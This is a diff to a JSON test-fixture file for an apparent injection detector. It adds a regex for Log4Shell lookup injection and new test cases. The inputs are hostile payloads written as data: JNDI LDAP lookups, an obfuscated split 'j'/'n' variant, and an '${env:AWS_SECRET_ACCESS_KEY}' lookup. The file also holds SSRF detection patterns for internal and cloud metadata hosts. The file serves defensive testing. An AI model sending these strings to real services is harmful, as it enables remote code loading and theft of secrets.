@@ -16,6 +16,14 @@
         "threats": [
           {
             "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${jndi:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
             "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
             "match": "${jndi:ldap://",
             "position": 0,
@@ -54,6 +62,14 @@
         "is_threat": true,
         "threat_score": 1.0,
         "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${${lower:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
           {
             "type": "regex",
             "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
@@ -96,6 +112,14 @@
         "threats": [
           {
             "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${jndi:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
             "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
             "match": "${jndi:dns://",
             "position": 0,
@@ -105,6 +129,134 @@
         ],
         "original_length": 27,
         "processed_length": 27,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "log4shell_jndi_ldaps",
+      "input": {
+        "content": "${jndi:ldaps://10.0.0.1/a}",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${jndi:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?:^|\\s|/)(?:(?<=://)[^\\s/@]*@)?(?:localhost\\.?|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::(?:\\d*)\\]|\\[::ffff:127\\.0\\.0\\.1\\]|169\\.254(?:\\.\\d{1,3}){2}|192\\.168(?:\\.\\d{1,3}){2}|10(?:\\.\\d{1,3}){3}|172\\.(?:1[6-9]|2[0-9]|3[01])(?:\\.\\d{1,3}){2}|metadata\\.google\\.internal|metadata\\.goog|100\\.100\\.100\\.200)(?::\\d+)?(?:\\s|$|/)",
+            "match": "/10.0.0.1/",
+            "position": 14,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "://(?:[^/@\\s]*@)?((?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)(?:\\.(?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)){0,3})(?=[:/\\s]|$)",
+            "match": "://10.0.0.1",
+            "position": 12,
+            "category": "ssrf",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 26,
+        "processed_length": 26,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "log4shell_jndi_split_default_values",
+      "input": {
+        "content": "${${::-j}${::-n}di:ldap://10.0.0.1/a}",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${${:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "(?:^|\\s|/)(?:(?<=://)[^\\s/@]*@)?(?:localhost\\.?|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::(?:\\d*)\\]|\\[::ffff:127\\.0\\.0\\.1\\]|169\\.254(?:\\.\\d{1,3}){2}|192\\.168(?:\\.\\d{1,3}){2}|10(?:\\.\\d{1,3}){3}|172\\.(?:1[6-9]|2[0-9]|3[01])(?:\\.\\d{1,3}){2}|metadata\\.google\\.internal|metadata\\.goog|100\\.100\\.100\\.200)(?::\\d+)?(?:\\s|$|/)",
+            "match": "/10.0.0.1/",
+            "position": 25,
+            "category": "ssrf",
+            "weight": 1.0
+          },
+          {
+            "type": "regex",
+            "pattern": "://(?:[^/@\\s]*@)?((?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)(?:\\.(?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)){0,3})(?=[:/\\s]|$)",
+            "match": "://10.0.0.1",
+            "position": 23,
+            "category": "ssrf",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 37,
+        "processed_length": 37,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "log4shell_env_lookup",
+      "input": {
+        "content": "${env:AWS_SECRET_ACCESS_KEY}",
+        "context": "header"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${env:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 28,
+        "processed_length": 28,
+        "detection_method": "enhanced"
+      }
+    },
+    {
+      "id": "log4shell_sys_lookup",
+      "input": {
+        "content": "${sys:java.version}",
+        "context": "request_body"
+      },
+      "expected": {
+        "is_threat": true,
+        "threat_score": 1.0,
+        "threats": [
+          {
+            "type": "regex",
+            "pattern": "(?i)\\$\\{(?:(?:jndi|env|sys|ctx|java|bundle|main|date|base64|lower|upper|marker|sd|map|k8s|docker|spring|web|log4j):|[a-z0-9_.-]{0,16}\\$\\{[a-z0-9]{0,12}:)",
+            "match": "${sys:",
+            "position": 0,
+            "category": "cmd_injection",
+            "weight": 1.0
+          }
+        ],
+        "original_length": 19,
+        "processed_length": 19,
         "detection_method": "enhanced"
       }
     },
